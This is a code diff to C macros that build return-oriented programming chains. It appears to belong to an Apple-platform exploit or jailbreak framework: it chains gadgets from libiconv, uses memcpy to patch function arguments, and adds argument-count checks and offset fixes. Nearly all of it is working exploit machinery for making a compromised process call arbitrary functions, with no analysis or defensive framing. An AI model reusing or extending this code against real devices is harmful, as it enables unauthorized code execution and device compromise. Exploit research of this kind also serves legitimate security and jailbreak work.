@@ -198,6 +198,7 @@ add_x0_gadget (from libiconv.2.dylib):
 #define INIT_FRAMEWORK(offsets) \
 	int ropchain_len = 0; \
 	int rop_var_tmp_nr = 0; \
+	int rop_var_arg_num = -1; \
 	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
 	rop_gadget_t * prev = NULL; \
 	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
@@ -235,6 +236,8 @@ add_x0_gadget (from libiconv.2.dylib):
 	
 // assuming we get here with pc pointing to the loader part of our beast gadget
 #define CALL_FUNCTION(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
+	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {printf("WRONG AMOUNT OF ARGS (line:%d)\n",__LINE__);exit(1);} \
+	rop_var_arg_num = -1; \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
@@ -383,9 +386,13 @@ add_x0_gadget (from libiconv.2.dylib):
 // TODO: make this faster
 #define ROP_VAR_ADD(result,var1,var2) \
 	ADD_COMMENT("add two rop vars"); \
+	ROP_VAR_ARG_HOW_MANY(2); \
 	ROP_VAR_ARG64(var1,6); \
 	ROP_VAR_ARG64(var2,7); \
 	CALL_FUNC_RET_SAVE_VAR(result,(offsets->add_x0_gadget), 0,0,0,0,0,0,0,0);
+
+#define ROP_VAR_ARG_HOW_MANY(howmany) \
+	rop_var_arg_num = howmany;
 
 // this is here to set the arg of a func call to a pointer to our rop var
 // it will call memcpy and then copy the address of our gadget over the argument in the next function call (9*8 to get to the next function 7*8 to get to the args and then nr*8 to get to the arg)
@@ -393,6 +400,8 @@ add_x0_gadget (from libiconv.2.dylib):
 // this is super dirty...
 // FIXME: there must be a better way to do this...
 #define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
+	if (rop_var_arg_num == -1) {printf("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)\n",__LINE__);exit(1);} \
+	rop_var_arg_num--; \
 	ADD_COMMENT("rop var arg with offset"); \
 	rop_var_tmp_nr = nr; \
 	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
@@ -403,7 +412,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* d8  */ \
 	ADD_GADGET(); /* x28 */ \
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
-	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8)); /* x26 */ \
+	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8+rop_var_arg_num*16*8)); /* x26 */ \
 	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
 	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x23 (the offset is pointing here) */ \
@@ -418,6 +427,8 @@ add_x0_gadget (from libiconv.2.dylib):
 
 // same as above but it doesn't copy the pointer but a uint64_t value
 #define ROP_VAR_ARG64(name,nr) \
+	if (rop_var_arg_num == -1) {printf("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)\n",__LINE__);exit(1);} \
+	rop_var_arg_num--; \
 	ADD_COMMENT("rop var arg 64"); \
 	rop_var_tmp_nr = nr; \
 	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
@@ -428,7 +439,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* d8 */ \
 	ADD_GADGET(); /* x28 */ \
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
-	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8)); /* x26 */ \
+	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8+rop_var_arg_num*16*8)); /* x26 */ \
 	ADD_ROP_VAR_GADGET(name); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
 	ADD_GADGET(); /* x23 */ \
